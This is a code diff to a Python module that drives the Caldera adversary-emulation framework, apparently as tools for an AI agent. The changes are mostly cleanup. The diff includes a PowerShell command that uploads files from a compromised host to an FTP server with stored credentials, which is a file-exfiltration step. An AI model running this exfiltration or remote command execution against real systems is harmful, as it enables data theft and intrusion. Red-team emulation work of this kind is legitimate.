@@ -1,6 +1,5 @@
 import subprocess
 from typing_extensions import Annotated
-import tiktoken
 import json
 import utils.constants
 from time import sleep
@@ -83,7 +82,6 @@ def caldera_api_request(
     # Truncate the output to 1000 characters
     # Also print a message to indicate that the output was truncated including the number of characters
     # TODO: Investigate why MessageTokenLimiter is not working as expected for this!
-    encoding = tiktoken.encoding_for_model("gpt-3.5-turbo")
     return truncate_str_to_tokens(return_info, 4000)
 
 
@@ -133,9 +131,9 @@ def caldera_upload_file_from_agent(
     # Get base name of the file
     basename = file_path.split("\\")[-1]
 
-    command = f"""$ftp = 'ftp://{utils.constants.FTP_SERVER_ADDRESS}/{basename}'; 
-    $user = '{utils.constants.FTP_SERVER_USER}'; $pass = '{utils.constants.FTP_SERVER_PASS}'; $webclient = New-Object System.Net.WebClient; 
-    $webclient.Credentials = New-Object System.Net.NetworkCredential($user, $pass); 
+    command = f"""$ftp = 'ftp://{utils.constants.FTP_SERVER_ADDRESS}/{basename}';
+    $user = '{utils.constants.FTP_SERVER_USER}'; $pass = '{utils.constants.FTP_SERVER_PASS}'; $webclient = New-Object System.Net.WebClient;
+    $webclient.Credentials = New-Object System.Net.NetworkCredential($user, $pass);
     $webclient.UploadFile($ftp, '{file_path}')
     """
 
@@ -172,6 +170,7 @@ def caldera_execute_command_on_agent(
 
     # Write the command to a file
     # Create the folder if it does not exist
+    # Do this after getting inspired by GPT that this is a great way to handle "memory" :)
     subprocess.run(f"mkdir -p {CALDERA_WORKING_FOLDER}", shell=True)
     with open(CALDERA_WORKING_FOLDER + "/parameters.json", "w") as f:
         f.write(json.dumps(command_arguments))
@@ -191,7 +190,7 @@ def caldera_execute_command_on_agent(
         # Try to load the output as JSON
         try:
             parsed_json = json.loads(command_output)
-        except Exception as e:
+        except Exception:
             return f"An error occurred while parsing the result of the command as JSON. Output: {command_output}"
 
         # Check if the "id" parameter is in the parsed JSON
@@ -234,7 +233,7 @@ def caldera_execute_command_on_agent(
             return_value = "Command output: " + base64.b64decode(
                 json.loads(command_output)["result"]
             ).decode("utf-8")
-        except json.JSONDecodeError as e:
+        except json.JSONDecodeError:
             # If the output is not valid JSON, return the original output
             return_value = "Command output: " + command_output
 
